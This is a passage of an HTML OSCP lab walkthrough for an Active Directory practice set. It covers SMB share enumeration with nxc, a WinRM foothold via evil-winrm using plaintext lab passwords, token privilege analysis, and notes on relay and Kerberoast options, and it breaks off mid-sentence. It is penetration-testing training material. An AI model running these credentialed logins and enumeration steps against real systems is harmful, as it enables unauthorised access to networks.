@@ -1,0 +1,1932 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>10.10.152.142 — MS02 · OSCP walkthrough</title>
+<meta name="description" content="Interactive walkthrough of the oscp.exam AD set from a position where DC01 is reachable: WinRM foothold, MSSQL ruled out, BloodHound analysis to a single Kerberoastable service account.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="10.10.152.142 — MS02 · OSCP walkthrough">
+<meta property="og:description" content="celia.almeda → WinRM → no SeImpersonate, no SQL sysadmin, no ACL edges → Kerberoast sql_svc.">
+<meta name="color-scheme" content="dark light">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --bg:#0a0e13; --bg2:#0f151d; --panel:#0d131b; --line:#1c2836; --line2:#263545;
+  --fg:#dde5ee; --dim:#8697ab; --dim2:#5d6d80;
+  --acc:#3fb950; --acc-dim:#1f6f31; --amber:#d29922; --red:#f85149; --link:#58a6ff;
+  --code:#070a0e; --shadow:0 20px 50px rgba(0,0,0,.45);
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
+}
+[data-theme="light"]{
+  --bg:#f4f6f9; --bg2:#ffffff; --panel:#ffffff; --line:#e3e8ef; --line2:#d3dae4;
+  --fg:#151b23; --dim:#5a6675; --dim2:#7d8898;
+  --acc:#1a7f37; --acc-dim:#8fd19e; --amber:#9a6700; --red:#cf222e; --link:#0969da;
+  --code:#0d1117; --shadow:0 16px 40px rgba(15,25,40,.10);
+}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);font-family:var(--sans);
+  font-size:16px;line-height:1.62;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--link);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.88em}
+.skip{position:absolute;left:-9999px;top:0;background:var(--acc);color:#04120a;padding:10px 16px;z-index:99}
+.skip:focus{left:8px;top:8px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;
+  padding:10px 18px;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:blur(14px);border-bottom:1px solid var(--line);
+}
+.brand{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:.02em;white-space:nowrap}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
+.brand .slash{color:var(--dim2);font-weight:400}
+.brand-sub{color:var(--dim);font-weight:500}
+.search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
+#search{
+  width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
+  background:var(--bg2);color:var(--fg);font-family:var(--sans);font-size:14px;outline:none;
+}
+#search:focus{border-color:var(--acc);box-shadow:0 0 0 3px color-mix(in srgb,var(--acc) 18%,transparent)}
+.search-count{position:absolute;right:10px;top:50%;transform:translateY(-50%);font-size:11px;color:var(--dim2)}
+.icon-btn{
+  background:var(--bg2);border:1px solid var(--line2);color:var(--fg);border-radius:10px;
+  width:38px;height:38px;font-size:16px;cursor:pointer;line-height:1;
+}
+.icon-btn:hover{border-color:var(--acc)}
+.burger{display:none;background:none;border:1px solid var(--line2);color:var(--fg);border-radius:9px;width:38px;height:38px;font-size:17px;cursor:pointer}
+
+/* ---------- shell ---------- */
+.shell{display:grid;grid-template-columns:296px minmax(0,1fr);gap:0;align-items:start}
+.sidebar{
+  position:sticky;top:59px;height:calc(100vh - 59px);overflow-y:auto;padding:20px 16px 60px;
+  border-right:1px solid var(--line);background:var(--bg);
+}
+.sidebar::-webkit-scrollbar{width:9px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--line2);border-radius:9px}
+
+.card{border:1px solid var(--line);border-radius:14px;padding:14px;background:var(--panel);margin-bottom:16px}
+.card h3{margin:0 0 10px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim)}
+.progress-track{height:6px;border-radius:99px;background:var(--line);overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc-dim),var(--acc));transition:width .35s ease}
+.progress-label{margin-top:9px;font-size:12px;color:var(--dim);display:flex;justify-content:space-between}
+.progress-label b{color:var(--fg)}
+
+.nav-title{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim2);margin:4px 8px 8px}
+.nav-item{
+  display:grid;grid-template-columns:26px 1fr 20px;align-items:center;gap:8px;
+  padding:9px 10px;border-radius:10px;color:var(--fg);font-size:14px;
+  border:1px solid transparent;text-decoration:none;
+}
+.nav-item:hover{background:var(--bg2);text-decoration:none}
+.nav-item.active{background:color-mix(in srgb,var(--acc) 12%,transparent);border-color:color-mix(in srgb,var(--acc) 35%,transparent)}
+.nav-item.active .nav-num{color:var(--acc)}
+.nav-item.done .nav-label{color:var(--dim);text-decoration:line-through}
+.nav-num{font-family:var(--mono);font-size:11px;color:var(--dim2)}
+.nav-check{appearance:none;width:16px;height:16px;border:1.5px solid var(--line2);border-radius:5px;cursor:pointer;margin:0;background:transparent}
+.nav-check:checked{background:var(--acc);border-color:var(--acc)}
+.nav-check:checked::after{content:"✓";display:block;color:#04120a;font-size:12px;line-height:13px;text-align:center;font-weight:700}
+.nav-tools{display:flex;gap:8px;margin-top:12px}
+.ghost{
+  flex:1;background:var(--bg2);border:1px solid var(--line2);color:var(--dim);
+  padding:7px 10px;border-radius:9px;font-size:12px;cursor:pointer;font-family:var(--sans);
+}
+.ghost:hover{color:var(--fg);border-color:var(--acc)}
+.meta-line{display:flex;justify-content:space-between;gap:10px;font-size:12px;padding:5px 0;border-bottom:1px dashed var(--line)}
+.meta-line:last-child{border-bottom:0}
+.meta-line span:first-child{color:var(--dim)}
+.meta-line span:last-child{font-family:var(--mono);font-size:11px;text-align:right}
+
+/* ---------- main ---------- */
+main{padding:34px 36px 90px;max-width:1000px;width:100%}
+
+.hero{margin-bottom:38px}
+.eyebrow{font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--acc);margin-bottom:12px}
+.hero h1{margin:0;font-size:clamp(28px,4vw,44px);line-height:1.12;letter-spacing:-.025em;font-family:var(--sans)}
+.hero h1 .ip{font-family:var(--mono);font-weight:600;font-size:.9em;letter-spacing:-.045em}
+.hero h1 .name{color:var(--dim);font-weight:500}
+.lede{color:var(--dim);font-size:17px;max-width:68ch;margin:14px 0 18px}
+.badges{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.badge{
+  font-size:12px;padding:5px 11px;border-radius:99px;border:1px solid var(--line2);
+  color:var(--dim);background:var(--bg2);font-family:var(--mono);
+}
+.badge.ok{color:var(--acc);border-color:color-mix(in srgb,var(--acc) 40%,transparent);background:color-mix(in srgb,var(--acc) 9%,transparent)}
+.badge.warn{color:var(--amber);border-color:color-mix(in srgb,var(--amber) 40%,transparent);background:color-mix(in srgb,var(--amber) 9%,transparent)}
+
+.chain{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:8px 0 6px}
+.step{
+  position:relative;display:flex;flex-direction:column;gap:3px;padding:12px;border-radius:12px;
+  border:1px solid var(--line);background:var(--panel);color:var(--fg);text-decoration:none;
+  transition:transform .15s ease,border-color .15s ease;
+}
+.step:hover{transform:translateY(-2px);border-color:var(--acc);text-decoration:none}
+.step-num{font-family:var(--mono);font-size:10px;color:var(--acc)}
+.step-label{font-weight:650;font-size:14px}
+.step-desc{font-size:11.5px;color:var(--dim);line-height:1.45}
+.step-desc code{font-size:11px;background:var(--code);padding:1px 4px;border-radius:4px;color:#c9d5e4}
+
+.flags{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;margin:26px 0 10px}
+.flag{border:1px solid var(--line);border-radius:14px;padding:16px;background:var(--panel)}
+.flag .k{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px}
+.flag .v{font-family:var(--mono);font-size:14px;word-break:break-all;min-height:22px}
+.flag.revealed .v{color:var(--acc)}
+.flag .reveal{margin-top:10px;background:none;border:0;color:var(--link);font-size:12px;cursor:pointer;padding:0}
+.flag .masked{letter-spacing:.18em;color:var(--dim2)}
+
+/* ---------- chapters ---------- */
+.chapter{scroll-margin-top:78px;margin:0 0 34px;border-top:1px solid var(--line);padding-top:26px}
+.ch-head{display:flex;align-items:flex-start;gap:14px;margin-bottom:6px}
+.ch-num{
+  font-family:var(--mono);font-size:12px;color:var(--acc);border:1px solid color-mix(in srgb,var(--acc) 35%,transparent);
+  background:color-mix(in srgb,var(--acc) 9%,transparent);border-radius:9px;padding:6px 9px;flex:none;
+}
+.ch-title{flex:1;min-width:0}
+.ch-title h2{margin:0;font-size:24px;letter-spacing:-.01em}
+.ch-sub{margin:2px 0 0;color:var(--dim);font-size:13.5px}
+.copyall{flex:none;max-width:140px}
+
+.content{font-size:15.3px}
+.content h3{font-size:18px;margin:0;letter-spacing:-.01em}
+.content h4{font-size:14px;margin:22px 0 8px;color:var(--dim);letter-spacing:.04em;text-transform:uppercase}
+.content p{margin:10px 0}
+.content ul,.content ol{padding-left:22px;margin:10px 0}
+.content li{margin:5px 0}
+.content strong{color:#fff}
+[data-theme="light"] .content strong{color:#000}
+.content code{
+  background:color-mix(in srgb,var(--line2) 42%,transparent);border:1px solid var(--line);
+  padding:.1em .36em;border-radius:5px;color:#e8eff8;white-space:nowrap;
+}
+[data-theme="light"] .content code{color:#0d1520;background:#edf1f6}
+.block pre code,.block pre span{background:none;border:0;padding:0}
+.content td code,.content li code{white-space:normal}
+.content hr{border:0;border-top:1px solid var(--line);margin:26px 0}
+.content blockquote{margin:14px 0;padding:10px 14px;border-left:3px solid var(--amber);background:color-mix(in srgb,var(--amber) 7%,transparent);border-radius:0 8px 8px 0;color:var(--dim)}
+.content blockquote p{margin:4px 0}
+
+.sec{border:1px solid var(--line);border-radius:12px;margin:14px 0;background:color-mix(in srgb,var(--panel) 60%,transparent);overflow:hidden}
+.sec-head{
+  width:100%;display:flex;align-items:center;gap:10px;background:none;border:0;color:var(--fg);
+  padding:12px 15px;font-size:17px;font-weight:650;cursor:pointer;text-align:left;font-family:var(--sans);
+}
+.sec-head:hover{background:var(--bg2)}
+.sec-head::before{content:"";flex:none;width:7px;height:7px;margin-top:-3px;border-right:1.7px solid var(--dim2);border-bottom:1.7px solid var(--dim2);transform:rotate(-45deg);transition:transform .18s ease}
+.sec-head[aria-expanded="true"]::before{transform:rotate(45deg);margin-top:-5px}
+.sec-body{padding:2px 15px 14px}
+.sec-body[hidden]{display:none}
+
+/* tables */
+table{border-collapse:collapse;width:100%;margin:14px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--bg2);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
+tr:nth-child(even) td{background:color-mix(in srgb,var(--bg2) 55%,transparent)}
+
+/* code cards */
+.block{margin:12px 0;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--code)}
+.block-bar{
+  display:flex;align-items:center;justify-content:space-between;padding:6px 10px;
+  background:#0b1017;border-bottom:1px solid #16202c;
+}
+[data-theme="light"] .block-bar{background:#161b22;border-bottom-color:#232c38}
+.block-tag{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:#5f7085}
+.block-cmd .block-tag{color:#3fb950}
+.copy{
+  background:#131c26;border:1px solid #24313f;color:#9fb0c3;border-radius:7px;
+  font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans);
+}
+.copy:hover{color:#fff;border-color:#3fb950}
+.copy.done{color:#3fb950;border-color:#3fb950}
+.block pre{margin:0;padding:13px 15px;overflow-x:auto;font-family:var(--mono);font-size:12.9px;line-height:1.6;color:#c9d5e4}
+.block-out{border-style:dashed}
+.block-out pre{color:#93a3b6}
+.codehilite{background:transparent}
+.codehilite pre{margin:0}
+.highlight .c,.highlight .c1,.highlight .cm{color:#5f7085;font-style:italic}
+.highlight .k,.highlight .kn,.highlight .kd{color:#d2a8ff}
+.highlight .s,.highlight .s1,.highlight .s2,.highlight .sb{color:#7ee787}
+.highlight .nb,.highlight .nf{color:#79c0ff}
+.highlight .nv,.highlight .vi{color:#ffa657}
+.highlight .mi,.highlight .m{color:#ffa657}
+.highlight .o,.highlight .p{color:#c9d5e4}
+.highlight .gp{color:#3fb950;font-weight:700}
+
+footer{margin-top:50px;padding-top:22px;border-top:1px solid var(--line);color:var(--dim2);font-size:12.5px;display:flex;flex-wrap:wrap;gap:14px;justify-content:space-between}
+
+/* toast + top button */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);opacity:0;pointer-events:none;
+  background:var(--acc);color:#04120a;padding:9px 16px;border-radius:99px;font-size:13px;font-weight:650;
+  transition:opacity .2s ease,transform .2s ease;z-index:60;
+}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+#toTop{
+  position:fixed;right:22px;bottom:22px;width:42px;height:42px;border-radius:50%;
+  background:var(--panel);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  opacity:0;pointer-events:none;transition:opacity .2s ease;z-index:50;font-size:16px;
+}
+#toTop.show{opacity:1;pointer-events:auto}
+#toTop:hover{border-color:var(--acc)}
+
+mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inherit;border-radius:3px}
+
+@media (max-width:940px){
+  .shell{grid-template-columns:1fr}
+  .sidebar{
+    position:fixed;inset:59px 0 0 0;height:auto;z-index:35;transform:translateX(-102%);
+    transition:transform .22s ease;width:296px;box-shadow:var(--shadow);
+  }
+  .sidebar.open{transform:none}
+  .burger{display:block}
+  main{padding:24px 18px 80px}
+  .search-wrap{max-width:none}
+  .copyall{display:none}
+  .brand-sub,.brand .slash{display:none}
+}
+@media print{
+  .topbar,.sidebar,#toTop,#toast,.copy,.copyall,.block-bar{display:none!important}
+  .shell{display:block}
+  main{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .sec{border:0;margin:0}
+  .sec-head{font-size:14px}
+  .sec-body{display:block!important}
+}
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="topbar">
+  <button class="burger" id="burger" type="button" aria-label="Open navigation">☰</button>
+  <div class="brand"><span class="dot"></span>OSCP<span class="slash">/</span><span class="brand-sub">oscp.exam · MS02</span></div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Search chapters…   ( / )" autocomplete="off" aria-label="Search chapters">
+    <span class="search-count" id="searchCount"></span>
+  </div>
+  <button class="icon-btn" id="themeBtn" type="button" aria-label="Toggle colour theme" title="Toggle theme">◐</button>
+</header>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="card">
+      <h3>Progress</h3>
+      <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
+      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+    </div>
+
+    <div class="nav-title">Chapters</div>
+    <nav><a class="nav-item" href="#ch-01" data-target="ch-01"><span class="nav-num">01</span><span class="nav-label">Reconnaissance</span><input class="nav-check" type="checkbox" data-ch="ch-01" aria-label="Mark Reconnaissance complete"></a>
+<a class="nav-item" href="#ch-02" data-target="ch-02"><span class="nav-num">02</span><span class="nav-label">Foothold</span><input class="nav-check" type="checkbox" data-ch="ch-02" aria-label="Mark Foothold complete"></a>
+<a class="nav-item" href="#ch-03" data-target="ch-03"><span class="nav-num">03</span><span class="nav-label">MSSQL</span><input class="nav-check" type="checkbox" data-ch="ch-03" aria-label="Mark MSSQL complete"></a>
+<a class="nav-item" href="#ch-04" data-target="ch-04"><span class="nav-num">04</span><span class="nav-label">Domain reconnaissance</span><input class="nav-check" type="checkbox" data-ch="ch-04" aria-label="Mark Domain reconnaissance complete"></a>
+<a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">BloodHound</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark BloodHound complete"></a>
+<a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">What is ruled out</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark What is ruled out complete"></a>
+<a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">Next actions</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark Next actions complete"></a>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+    <div class="nav-tools">
+      <button class="ghost" id="expandAll" type="button">Expand all</button>
+      <button class="ghost" id="collapseAll" type="button">Collapse all</button>
+    </div>
+    <div class="nav-tools"><button class="ghost" id="resetProgress" type="button">Reset progress</button></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>Target</h3>
+      <div class="meta-line"><span>Domain</span><span>oscp.exam</span></div>
+      <div class="meta-line"><span>MS02</span><span>10.10.152.142</span></div>
+      <div class="meta-line"><span>DC01</span><span>10.10.152.140</span></div>
+      <div class="meta-line"><span>Domain SID</span><span>…-2610934713-1581164095-2706428072</span></div>
+      <div class="meta-line"><span>Access</span><span>WinRM · celia.almeda</span></div>
+      <div class="meta-line"><span>Result</span><span>MS02 foothold</span></div>
+    </div>
+
+    <div class="card">
+      <h3>Source</h3>
+      <div class="meta-line"><span>Repo</span><span><a href="https://github.com/AV10V/OSCP">AV10V/OSCP</a></span></div>
+      <div class="meta-line"><span>Notes</span><span>markdown</span></div>
+      <div class="meta-line"><span>All labs</span><span><a href="../../main.html">main</a></span></div>
+    </div>
+  </aside>
+
+  <main id="main">
+    <section class="hero" id="overview">
+      <div class="eyebrow">OSCP lab walkthrough</div>
+      <h1><span class="ip">10.10.152.0/24</span> <span class="name">— oscp.exam · MS02</span></h1>
+      <p class="lede">
+        The same directory as the earlier AD set, seen from a network where the domain controller finally answers directly. Two credentials, four protocols, and every local path closed by the token itself — which leaves one stale service account.
+      </p>
+      <div class="badges">
+        <span class="badge">Server 2019 · build 19041</span>
+        <span class="badge">oscp.exam</span>
+        <span class="badge warn">SMB signing off (MS02)</span>
+        <span class="badge ok">DC01 direct</span>
+        <span class="badge warn">no SeImpersonate</span>
+        <span class="badge warn">sysadmin = 0</span>
+      </div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">no shares, <code>signing:False</code></span></a>
+<a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">WinRM</span><span class="step-desc"><code>celia.almeda</code>, medium integrity</span></a>
+<a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">MSSQL</span><span class="step-desc">two logins, <code>sysadmin = 0</code></span></a>
+<a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">Domain</span><span class="step-desc">DC01 direct, <code>Users</code> share</span></a>
+<a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">Graph</span><span class="step-desc">zero outbound ACEs</span></a>
+<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">Ruled out</span><span class="step-desc">seven paths, closed with evidence</span></a>
+<a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">Next</span><span class="step-desc">roast <code>sql_svc</code></span></a></div>
+      <div class="flags">
+
+      </div>
+    </section>
+
+    <section class="chapter" id="ch-01" data-title="Reconnaissance"><div class="ch-head"><span class="ch-num">01</span><div class="ch-title"><h2>Reconnaissance</h2><p class="ch-sub">Same directory, new network position</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Goal: establish what this network position actually gives us, and separate what is <em>reachable</em> from
+what is <em>owned</em>. This leg starts with credentials in hand — the work is proving what they are worth.</p>
+<hr />
+<h3>1.1 Where this leg sits</h3>
+<p>This is the same <code>oscp.exam</code> directory as the earlier AD page, seen from a different network:</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Earlier AD leg</th>
+<th>This leg</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain SID</td>
+<td><code>S-1-5-21-2610934713-1581164095-2706428072</code></td>
+<td>identical</td>
+</tr>
+<tr>
+<td>Domain GUID</td>
+<td><code>e7448cc9-434a-4130-90b0-812d3d0c5a96</code></td>
+<td>identical</td>
+</tr>
+<tr>
+<td>DC01</td>
+<td><code>10.10.118.146</code></td>
+<td><code>10.10.152.140</code></td>
+</tr>
+<tr>
+<td>MS01</td>
+<td><code>10.10.118.147</code></td>
+<td>present in the directory, address not captured</td>
+</tr>
+<tr>
+<td>Reachability</td>
+<td>DC only through the MS01 SOCKS tunnel</td>
+<td>DC answers directly</td>
+</tr>
+</tbody>
+</table>
+<p>The SID and GUID matching is the useful part: it is one directory database, not a second forest that
+happens to share a name. Whether DC01 is dual-homed onto both networks or the set was re-addressed is
+<strong>not established</strong> — only that it now answers on <code>10.10.152.140</code>.</p>
+<p>That single change removes the chapter 05 problem entirely. There is no pivot to build, no
+<code>proxychains</code> wrapper on every command, and Kerberos talks to a KDC we can actually reach. Everything
+below is direct.</p>
+<hr />
+<h3>1.2 Starting position</h3>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Secret</th>
+<th>Where it came from</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>OSCP\celia.almeda</code></td>
+<td><code>7k8XHk3dMtmpnC7</code></td>
+<td>in hand when this leg began</td>
+</tr>
+<tr>
+<td><code>OSCP\web_svc</code></td>
+<td><code>Diamond1</code></td>
+<td>in hand when this leg began</td>
+</tr>
+<tr>
+<td><code>OSCP\eric.wallows</code></td>
+<td><code>EricLikesRunning800</code></td>
+<td>carried over from the earlier AD leg</td>
+</tr>
+</tbody>
+</table>
+<p>The first two were already captured before this session started; that acquisition step is not in these
+notes and is therefore not reconstructed here. <code>eric.wallows</code> is the domain user from the MS01 leg —
+the same password still works, which is itself a finding.</p>
+<hr />
+<h3>1.3 First contact with MS02</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Diamond1&#39;</span><span class="w"> </span>--shares
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.142  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64
+                                  (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
+SMB  10.10.152.142  445  MS02  [+] oscp.exam\web_svc:Diamond1
+SMB  10.10.152.142  445  MS02  [*] Enumerated shares
+SMB  10.10.152.142  445  MS02      Share           Permissions     Remark
+SMB  10.10.152.142  445  MS02      -----           -----------     ------
+SMB  10.10.152.142  445  MS02      ADMIN$                          Remote Admin
+SMB  10.10.152.142  445  MS02      C$                              Default share
+SMB  10.10.152.142  445  MS02      IPC$            READ            Remote IPC</span></pre></div>
+<p>Three facts, and two of them are about what we cannot do.</p>
+<p><strong><code>signing:False</code></strong> — MS02 does not require SMB signing, so it is a valid relay target in principle.
+Park that; it only matters if something can be coerced into authenticating to us, and nothing has been
+coerced yet.</p>
+<p><strong><code>ADMIN$</code> and <code>C$</code> are blank</strong> — not "denied", blank. The share exists and is enumerated, but this
+account holds no access. <code>web_svc</code> is not a local administrator on MS02, and no amount of share
+enumeration will change that. The whole <code>--shares</code> avenue is closed in one line.</p>
+<p><strong><code>IPC$</code> is <code>READ</code></strong> — every authenticated account has that. It is the null session's authenticated
+cousin: useful for RPC enumeration, meaningless as access.</p>
+<p>Build <code>19041</code> on a host named <code>MS02</code> while DC01 reports <code>17763</code> is a mismatch worth noticing: the member
+server is a newer build than the domain controller.</p>
+<hr />
+<h3>1.4 The address the prompt was hiding</h3>
+<p>The MSSQL prompt in the next chapter reads <code>guest@master</code>, and it would be easy to assume <code>guest</code> is a
+separate database server. It is not:</p>
+<ul>
+<li><code>nxc</code> authenticates <code>oscp.exam\web_svc</code> against <code>10.10.152.142</code> and gets <code>MS02</code>;</li>
+<li>the same account opens a SQL session on a host whose NetBIOS name is <code>guest</code>.</li>
+</ul>
+<p>Same account, same box, two protocols. There is no pivot between them, which means the SQL work and the
+WinRM work are two views of one machine. That matters for the escalation logic in chapter 03: a SQL
+escalation lands on MS02, not somewhere new.</p>
+<hr />
+<h3>1.5 What this chapter leaves open</h3>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Is <code>web_svc</code> a local admin on MS02?</td>
+<td><strong>No</strong> — <code>ADMIN$</code>/<code>C$</code> empty</td>
+</tr>
+<tr>
+<td>Can we relay to MS02?</td>
+<td>possible, <code>signing:False</code> — no coercion attempted</td>
+</tr>
+<tr>
+<td>Is the DC reachable without a pivot?</td>
+<td><strong>Yes</strong> — <code>10.10.152.140</code></td>
+</tr>
+<tr>
+<td>Are these credentials still current?</td>
+<td><strong>Yes</strong> — both authenticate</td>
+</tr>
+</tbody>
+</table>
+<p>The remaining surface is identity, not transport: WinRM on MS02 (chapter 02), MSSQL on MS02 (chapter
+03), and the directory itself (chapter 04).</p></div></section>
+<section class="chapter" id="ch-02" data-title="Foothold"><div class="ch-head"><span class="ch-num">02</span><div class="ch-title"><h2>Foothold</h2><p class="ch-sub">WinRM, and the token that proves nothing</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>celia.almeda</code> authenticates over WinRM and lands on MS02 with a shell. The point of this chapter is
+not the shell — it is proving what the token does <strong>not</strong> contain, because that decides whether the box
+falls here or somewhere else.</p>
+<hr />
+<h3>2.1 The connection</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Evil-WinRM shell v3.9
+Warning: Remote path completions is disabled due to ruby limitation
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents&gt;</span></pre></div>
+<p>A domain user over WinRM on a member server. Nothing exotic — the interesting part is the token.</p>
+<hr />
+<h3>2.2 The token</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">USER INFORMATION
+----------------
+User Name         SID
+================= ============================================
+oscp\celia.almeda S-1-5-21-2610934713-1581164095-2706428072-1105
+
+GROUP INFORMATION
+-----------------
+Everyone                              Well-known group S-1-1-0
+BUILTIN\Remote Management Users       Alias            S-1-5-32-580
+BUILTIN\Users                         Alias            S-1-5-32-545
+NT AUTHORITY\NETWORK                  Well-known group S-1-5-2
+NT AUTHORITY\Authenticated Users      Well-known group S-1-5-11
+NT AUTHORITY\This Organization        Well-known group S-1-5-15
+NT AUTHORITY\NTLM Authentication      Well-known group S-1-5-64-10
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+PRIVILEGES INFORMATION
+----------------------
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled</span></pre></div>
+<p>Read it in three steps.</p>
+<p><strong><code>BUILTIN\Remote Management Users</code></strong> is the only reason this works. That group — not local
+Administrators — is what authorises WinRM. It is an explicit, deliberate grant on MS02, and it is the
+whole foothold.</p>
+<p><strong>The privilege list is the standard five.</strong> <code>SeShutdown</code>, <code>SeChangeNotify</code>, <code>SeUndock</code>,
+<code>SeIncreaseWorkingSet</code>, <code>SeTimeZone</code>. Nothing else. In particular:</p>
+<ul>
+<li>no <code>SeImpersonatePrivilege</code></li>
+<li>no <code>SeAssignPrimaryTokenPrivilege</code></li>
+<li>no <code>SeDebugPrivilege</code></li>
+<li>no <code>SeBackupPrivilege</code></li>
+</ul>
+<p><strong><code>Medium Mandatory Level</code></strong> confirms it: a normal user token, not a filtered administrator token.</p>
+<hr />
+<h3>2.3 Why this is a proof, not an assumption</h3>
+<p>The temptation is to say "no SeImpersonate, so no potato" and move on. The stronger argument is that
+this token could not have been an administrator's in the first place, whatever its privileges looked
+like.</p>
+<p>UAC remote restrictions (<code>LocalAccountTokenFilterPolicy</code>) apply to <strong>local</strong> accounts. A <strong>domain</strong>
+account that sits in the machine's local <code>Administrators</code> group, authenticating over WinRM, receives a
